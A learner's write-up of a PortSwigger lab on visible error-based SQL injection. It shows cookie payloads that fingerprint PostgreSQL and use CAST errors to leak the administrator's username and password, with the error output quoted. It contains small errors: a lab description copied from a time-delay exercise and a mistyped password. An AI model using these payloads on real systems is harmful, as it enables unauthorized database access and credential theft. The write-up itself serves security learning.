# Visible error-based SQL injection

**Category:** Web Exploitation — SQL Injection  
**Difficulty:** Practitioner
**Progress:** Solved

---

## Description

**Lab URL:** `https://portswigger.net/web-security/sql-injection/blind/lab-sql-injection-visible-error-based`

This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.

The results of the SQL query are not returned, and the application does not respond any differently based on whether the query returns any rows or causes an error. However, since the query is executed synchronously, it is possible to trigger conditional time delays to infer information.

To solve the lab, exploit the SQL injection vulnerability to cause a 10 second delay. 


---

## Reconnaissance

- What does the application do? 
    - Still the same basic shop website
- Where is user input accepted? (forms, URL parameters, headers, cookies)
    - there is no input field (account login is back) but the user can input text into the url as before. The real input for the sqli happens in the cookie though.
- What happens with normal input?
    - inputting a normal word instead of the given categories prints the word on the page and shows no results, inputting the given categories works like it should

---

## Analysis

#### Technology Stack

 - Database:   PostgreSQL (see [Fingerprinting](#step-1---fingerprinting-the-database))
 - Input:      URL
 - Behavior:   visible error-based SQL Injection


#### Vulnerability

- What exactly is vulnerable and why?
    
As per the lab instructions the cookie containing a `TrackingId` is vulnerable.
The sql in the background looks like this:
```sql
SELECT * FROM tracking WHERE id = [input]
```
This works like it should if there is just a TrackingId in the cookie, but if an Attacker puts sql in there this is unsafe.


---

## Solution 

### Step 1 - Fingerprinting the database 

First step is to find the underlying database to not run into syntax errors later.
```sql
TrackingId=tTjqMNt9jMtfVHgX'|| (select banner FROM v$version)||'
```
returns `ERROR: relation "v$version" does not exist Position: 76`
This means that the underlying database is not oracle, since `v$version` is oracle specific.
Same result for 
```sql
TrackingId=tTjqMNt9jMtfVHgX'|| (SELECT @@version)||'
```
But for 
```sql
TrackingId=tTjqMNt9jMtfVHgX'|| (SELECT version())||'  
```
there is no error - that means the database uses PostgreSQL.

Using the CAST() function introduced by the lab:
```sql
TrackingId=tTjqMNt9jMtfVHgX'|| cast((SELECT version()) as INTEGER)||'  
```
reveals the version:
`ERROR: invalid input syntax for type integer: "PostgreSQL 12.22 (Ubuntu 12.22-0ubuntu0.20.04.4) on x86_64-pc-linux-gnu, compiled by gcc (Ubuntu 9.4.0-1ubuntu1~20.04.2) 9.4.0, 64-bit"`

So the cast to integer breaks the whole thing.
---

### Step 2 - Enumeration

First try to solve with the cast method:
```sql
TrackingId=tTjqMNt9jMtfVHgX'|| cast((SELECT password FROM user) AS INT)||'
```
returns `Unterminated string literal started at position 95 in SQL SELECT * FROM tracking WHERE id = 'tTjqMNt9jMtfVHgX'|| cast((SELECT password FROM user) AS INT)'. Expected  char`
So do many other inputs. 
It could be that our input is capped to length 95
To verify:
```sql
TrackingId=tTjqMNt9jMtfVHgX'|| 'hallo' || cast((SELECT version()) as INTEGER)||'  
```
throws the same error with 95 again.

New try:
```sql
TrackingId=tTjqMNt9jMtfVHgX'|| cast((SELECT * FROM users) as INT)||'  
```
returns another error: `ERROR: subquery must return only one column`


### Step 3 - Extract / Exploit

Toying around with that was not successfull. But multiple tries later I got the idea to trim the `TrackingId`

```sql
TrackingId=t'||CAST((SELECT username FROM users LIMIT 1)AS INT)||' 
```
Now the Error looks like this: `ERROR: invalid input syntax for type integer: "administrator"`
So the username is: administrator

Same query with `password`:
```sql
TrackingId=t'||CAST((SELECT password FROM users LIMIT 1)AS INT)||' 
```
Now the Error looks like this: `ERROR: invalid input syntax for type integer: "sl4sm0lj2b1pltb1csmr"`
So the password is: sl4sm0lj2b1pltb1csm

Now it is possible to login as an admin and finish the lab.
---


## Real World Impact

The application leaked practically nothing again form the perspective of a developer and even the error output did not work with long sql queries but some tricks still made it possible to get a full admin login. This is way worse than blind sqli though since it takes an attacker just a couple of queries compared to mutliple bit-by-bit extractions. Same learning as before: sql needs to be parameterized.
---

## Learnings

- Forcing type conversion failures turns error messages into weapons. 
- knowing sql syntax and keywords is key (Will need a refresher here)

